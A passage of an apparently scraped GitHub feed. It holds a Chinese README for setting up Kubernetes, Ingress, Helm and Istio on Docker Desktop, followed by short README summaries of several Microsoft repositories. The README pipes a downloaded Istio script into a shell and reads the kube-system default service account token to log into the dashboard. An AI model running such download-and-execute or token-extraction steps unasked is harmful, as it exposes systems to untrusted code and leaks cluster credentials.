kubernetes-dashboard.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;检查 kubernetes-dashboard 应用状态&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get pod -n kubernetes-dashboard&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;开启 API Server 访问代理&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl proxy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;通过如下 URL 访问 Kubernetes dashboard&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/&#34;&gt;http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;配置控制台访问令牌&lt;/h4&gt; &#xA;&lt;p&gt;授权&lt;code&gt;kube-system&lt;/code&gt;默认服务账号&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f kube-system-default.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;对于Mac环境&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;TOKEN=$(kubectl -n kube-system describe secret default| awk &#39;$1==&#34;token:&#34;{print $2}&#39;)&#xA;kubectl config set-credentials docker-desktop --token=&#34;${TOKEN}&#34;&#xA;echo $TOKEN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;对于Windows环境&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$TOKEN=((kubectl -n kube-system describe secret default | Select-String &#34;token:&#34;) -split &#34; +&#34;)[1]&#xA;kubectl config set-credentials docker-desktop --token=&#34;${TOKEN}&#34;&#xA;echo $TOKEN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;登录dashboard的时候&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/images/k8s_credentials.png&#34; alt=&#34;resource&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;选择 &lt;strong&gt;令牌&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;输入上文控制台输出的内容&lt;/p&gt; &#xA;&lt;p&gt;或者选择 &lt;strong&gt;Kubeconfig&lt;/strong&gt; 文件,路径如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Mac: $HOME/.kube/config&#xA;Win: %UserProfile%\.kube\config&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;点击登陆，进入Kubernetes Dashboard&lt;/p&gt; &#xA;&lt;h3&gt;配置 Ingress&lt;/h3&gt; &#xA;&lt;p&gt;说明：如果测试 Istio，不需要安装 Ingress&lt;/p&gt; &#xA;&lt;h4&gt;安装 Ingress&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/kubernetes/ingress-nginx/raw/master/docs/deploy/index.md&#34;&gt;源地址安装说明&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;- 若安装脚本无法安装，可以跳转到该地址查看最新操作&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;安装&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;或&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f ingress-nginx-controller.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;验证&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get pods --all-namespaces -l app.kubernetes.io/name=ingress-nginx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;测试示例应用&lt;/h4&gt; &#xA;&lt;p&gt;部署测试应用，详情参见&lt;a href=&#34;https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html&#34;&gt;社区文章&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl create -f sample/apple.yaml&#xA;kubectl create -f sample/banana.yaml&#xA;kubectl create -f sample/ingress.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;测试示例应用&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl -kL http://localhost/apple&#xA;apple&#xA;$ curl -kL http://localhost/banana&#xA;banana&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;删除示例应用&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl delete -f sample/apple.yaml&#xA;kubectl delete -f sample/banana.yaml&#xA;kubectl delete -f sample/ingress.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;删除 Ingress&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl delete -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;安装 Helm&lt;/h3&gt; &#xA;&lt;p&gt;可以根据文档安装 helm v3 &lt;a href=&#34;https://helm.sh/docs/intro/install/&#34;&gt;https://helm.sh/docs/intro/install/&lt;/a&gt; 在国内由于helm的cdn节点使用的是谷歌云所以可能访问不到，可以参考已存在的官方issue： &lt;a href=&#34;https://github.com/helm/helm/issues/7028&#34;&gt;https://github.com/helm/helm/issues/7028&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;在 Mac OS 上安装&lt;/h4&gt; &#xA;&lt;h5&gt;通过 brew 安装&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Use homebrew on Mac&#xA;brew install helm&#xA;&#xA;# Add helm repo&#xA;helm repo add stable http://mirror.azure.cn/kubernetes/charts/&#xA;&#xA;# Update charts repo&#xA;helm repo update&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;在Windows上安装&lt;/h4&gt; &#xA;&lt;p&gt;如果在后续使用 helm 安装组件的过程中出现版本兼容问题，可以参考 &lt;code&gt;通过二进制包安装&lt;/code&gt; 思路安装匹配的版本&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Use Chocolatey on Windows&#xA;# 注：安装的时候需要保证网络能够访问googleapis这个域名&#xA;choco install kubernetes-helm&#xA;&#xA;# Change helm repo&#xA;helm repo add stable http://mirror.azure.cn/kubernetes/charts/&#xA;&#xA;# Update charts repo&#xA;helm repo update&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;测试 Helm (可选)&lt;/h4&gt; &#xA;&lt;p&gt;安装 Wordpress&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;helm install wordpress stable/wordpress&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;查看 wordpress 发布状态&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;helm status wordpress&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;卸载 wordpress 发布&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;helm uninstall wordpress&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;配置 Istio&lt;/h3&gt; &#xA;&lt;p&gt;说明：Istio Ingress Gateway和Ingress缺省的端口冲突，请移除Ingress并进行下面测试&lt;/p&gt; &#xA;&lt;p&gt;可以根据文档安装 Istio &lt;a href=&#34;https://istio.io/docs/setup/getting-started/&#34;&gt;https://istio.io/docs/setup/getting-started/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;下载 Istio 1.5.0&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.5.0 sh -&#xA;cd istio-1.5.0&#xA;export PATH=$PWD/bin:$PATH&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在Windows上，您可以手工下载Istio安装包，或者把&lt;code&gt;getLatestIstio.ps1&lt;/code&gt;拷贝到你希望下载 Istio 的目录，并执行 - 说明：根据社区提供的&lt;a href=&#34;https://gist.github.com/kameshsampath/796060a806da15b39aa9569c8f8e6bcf&#34;&gt;安装脚本&lt;/a&gt;修改而来&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;.\getLatestIstio.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;安装 Istio&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;istioctl manifest apply --set profile=demo&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;检查 Istio 状态&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get pods -n istio-system&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;为 &lt;code&gt;default&lt;/code&gt; 名空间开启自动 sidecar 注入&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl label namespace default istio-injection=enabled&#xA;kubectl get namespace -L istio-injection&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;安装 Book Info 示例&lt;/h4&gt; &#xA;&lt;p&gt;请参考 &lt;a href=&#34;https://istio.io/docs/examples/bookinfo/&#34;&gt;https://istio.io/docs/examples/bookinfo/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;查看示例应用资源&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get svc,pod&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;确认示例应用在运行中&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl exec -it $(kubectl get pod -l app=ratings -o jsonpath=&#39;{.items[0].metadata.name}&#39;) -c ratings -- curl productpage:9080/productpage | grep -o &#34;&amp;lt;title&amp;gt;.*&amp;lt;/title&amp;gt;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;创建 Ingress Gateway&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;查看 Gateway 配置&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl get gateway&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;确认示例应用可以访问&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;export GATEWAY_URL=localhost:80&#xA;curl -s http://${GATEWAY_URL}/productpage | grep -o &#34;&amp;lt;title&amp;gt;.*&amp;lt;/title&amp;gt;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;可以通过浏览器访问&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://localhost/productpage&#34;&gt;http://localhost/productpage&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;删除实例应用&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;samples/bookinfo/platform/kube/cleanup.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;卸载 Istio&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;istioctl manifest generate --set profile=demo | kubectl delete -f -&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>microsoft/navcontainerhelper</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/microsoft/navcontainerhelper</id>
    <link href="https://github.com/microsoft/navcontainerhelper" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Official Microsoft repository for BcContainerHelper, a PowerShell module, which makes it easier to work with Business Central Containers on Docker.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NAV Container Helper&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains a module, which makes it easier to work with Business Central and NAV Containers on Docker. The module is work in progress and feel free to submit pull requests and contribute with good ideas. Documentation will be on the wiki.&lt;/p&gt; &#xA;&lt;h1&gt;Branches&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;NavContainerHelper&lt;/strong&gt; is the main repo for the NavContainerHelper PowerShell module on PowerShell Gallery. &lt;strong&gt;NavContainerHelper&lt;/strong&gt; will as of August 1st 2020 only receive bug fixes.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;master&lt;/strong&gt; is the main repo for the BcContainerHelper PowerShell module on PowerShell Gallery. &lt;strong&gt;BcContainerHelper&lt;/strong&gt; will from August 1st 2020 ship as release and pre-release.&lt;/p&gt; &#xA;&lt;p&gt;Please report issues in the issues list.&lt;/p&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>microsoftgraph/microsoft-graph-docs</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/microsoftgraph/microsoft-graph-docs</id>
    <link href="https://github.com/microsoftgraph/microsoft-graph-docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Documentation for the Microsoft Graph REST API&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Graph documentation&lt;/h1&gt; &#xA;&lt;p&gt;Thank you for your interest in Microsoft Graph documentation! For the best experience, we recommend you view this content on the &lt;a href=&#34;https://docs.microsoft.com/graph&#34;&gt;Microsoft Graph Developer Portal&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Give us your feedback&lt;/h2&gt; &#xA;&lt;p&gt;Your feedback is important to us.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To let us know about any questions or issues you find in the documentation, &lt;a href=&#34;https://github.com/microsoftgraph/microsoft-graph-docs/issues&#34;&gt;submit an issue&lt;/a&gt; in this repository.&lt;/li&gt; &#xA; &lt;li&gt;We also encourage you to fork, make the fix, and do a pull request of your proposed changes. See &lt;a href=&#34;https://raw.githubusercontent.com/microsoftgraph/microsoft-graph-docs/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; for contributing guidelines.&lt;/li&gt; &#xA; &lt;li&gt;To let us know about your programming experience, what you would like to see in future versions, code samples, and so on, enter your suggestions and ideas at &lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-365-developer-platform/idb-p/Microsoft365DeveloperPlatform/label-name/Microsoft%20Graph&#34;&gt;Microsoft 365 Developer Platform Tech Community&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Code of conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>microsoft/CloudAdoptionFramework</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/microsoft/CloudAdoptionFramework</id>
    <link href="https://github.com/microsoft/CloudAdoptionFramework" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Code samples and extended documentation to support the guidance provided in the Microsoft Cloud Adoption Framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Cloud Adoption Framework for Azure&lt;/h1&gt; &#xA;&lt;p&gt;This repo contains code samples which support and accelerate the adoption guidance found in the &lt;a href=&#34;https://aka.ms/CAF&#34;&gt;Cloud Adoption Framework&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Cloud Adoption Framework is the One Microsoft voice for cloud adoption, consolidating and sharing best practices from Microsoft employees, partners, and customers. In this framework, customers will find tools, guidance, and narratives to help shape technology, business, and people strategies in an effort to drive desired business outcomes during each adoption effort. This lifecycle &#34;product&#34; aligns guidance to various phases and iterations of the typical cloud adoption lifecycle to ensure easy access to the right guidance at the right time.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation repository&lt;/h2&gt; &#xA;&lt;p&gt;If you&#39;re looking to contribute to or report an issue regarding the Cloud Adoption Framework documentation found on Microsoft Docs, please visit the &lt;a href=&#34;https://github.com/MicrosoftDocs/cloud-adoption-framework&#34;&gt;Cloud Adoption Framework documentation repository on GitHub&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;!--&#xA;![Cloud Adoption Framework overview](https://docs.microsoft.com/azure/architecture/cloud-adoption/_images/cloud-adoption-framework-overview.png) &#xA;--&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;Legal Notices&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft and any contributors grant you a license to the Microsoft documentation and other content in this repository under the &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/legalcode&#34;&gt;Creative Commons Attribution 4.0 International Public License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/CloudAdoptionFramework/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file, and grant you a license to any code in the repository under the &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;MIT License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/CloudAdoptionFramework/master/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;Microsoft, Windows, Microsoft Azure and/or other Microsoft products and services referenced in the documentation may be either trademarks or registered trademarks of Microsoft in the United States and/or other countries. The licenses for this project do not grant you rights to use any Microsoft names, logos, or trademarks. Microsoft&#39;s general trademark guidelines can be found at &lt;a href=&#34;http://go.microsoft.com/fwlink/?LinkID=254653&#34;&gt;http://go.microsoft.com/fwlink/?LinkID=254653&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Privacy information can be found at &lt;a href=&#34;https://privacy.microsoft.com/en-us/&#34;&gt;https://privacy.microsoft.com/en-us/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Microsoft and any contributors reserve all other rights, whether under their respective copyrights, patents, or trademarks, whether by implication, estoppel or otherwise.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftDocs/azure-docs-cli</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftDocs/azure-docs-cli</id>
    <link href="https://github.com/MicrosoftDocs/azure-docs-cli" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Repository used to store content for the docs.microsoft.com content for the Azure CLI&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure CLI documentation&lt;/h1&gt; &#xA;&lt;p&gt;This repository hosts the documentation source for the Azure CLI, published on &lt;a href=&#34;https://docs.microsoft.com/cli/azure/&#34;&gt;docs.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Public contributions&lt;/h2&gt; &#xA;&lt;p&gt;We welcome public contributions to the Azure CLI documentation! There are two types of documentation hosted in this repository, with different workflows:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To submit a change for &lt;em&gt;conceptual&lt;/em&gt; documentation (content in the &lt;code&gt;docs-ref-conceptual&lt;/code&gt; directory) make a pull request against this repository.&lt;/li&gt; &#xA; &lt;li&gt;To submit a change for &lt;em&gt;reference&lt;/em&gt; documentation (all other documentation), please make a pull request against &lt;a href=&#34;https://github.com/azure/azure-cli&#34;&gt;azure/azure-cli&lt;/a&gt;. This reference is generated from the source code, and is also used in the command-line &lt;code&gt;-h&lt;/code&gt; help.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Microsoft Open Source Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ScoopInstaller/Extras</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/ScoopInstaller/Extras</id>
    <link href="https://github.com/ScoopInstaller/Extras" rel="alternate"></link>
    <summary type="html">&lt;p&gt;📦 The Extras bucket for Scoop.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Scoop Extras &lt;a href=&#34;https://github.com/ScoopInstaller/Extras/actions/workflows/ci.yml&#34;&gt;&lt;img src=&#34;https://github.com/ScoopInstaller/Extras/actions/workflows/ci.yml/badge.svg?sanitize=true&#34; alt=&#34;Tests&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ScoopInstaller/Extras/actions/workflows/excavator.yml&#34;&gt;&lt;img src=&#34;https://github.com/ScoopInstaller/Extras/actions/workflows/excavator.yml/badge.svg?sanitize=true&#34; alt=&#34;Excavator&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;Extra manifests for &lt;a href=&#34;https://scoop.sh&#34;&gt;Scoop&lt;/a&gt;, the Windows command-line installer. For manifests that don&#39;t fit the &lt;a href=&#34;https://github.com/ScoopInstaller/Scoop/wiki/Criteria-for-including-apps-in-the-main-bucket&#34;&gt;Main criteria&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How do I install these manifests?&lt;/h2&gt; &#xA;&lt;p&gt;To add this bucket, run &lt;code&gt;scoop bucket add extras&lt;/code&gt;. To install, do &lt;code&gt;scoop install &amp;lt;manifest&amp;gt;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How do I contribute new manifests?&lt;/h2&gt; &#xA;&lt;p&gt;To make a new manifest contribution, please read the &lt;a href=&#34;https://github.com/ScoopInstaller/.github/raw/main/.github/CONTRIBUTING.md&#34;&gt;Contributing Guide&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Azure-Samples/functions-docs-powershell</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/Azure-Samples/functions-docs-powershell</id>
    <link href="https://github.com/Azure-Samples/functions-docs-powershell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PowerShell samples that support Azure Functions docs&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure Functions PowerShell sample snippets repository&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains the PowerShell source code featured in &lt;a href=&#34;https://docs.microsoft.com/azure/azure-functions/&#34;&gt;Azure Functions documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.opensource.microsoft.com&#34;&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftDocs/dataexplorer-docs</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftDocs/dataexplorer-docs</id>
    <link href="https://github.com/MicrosoftDocs/dataexplorer-docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Azure Data Explorer&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Microsoft Open Source Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
</feed>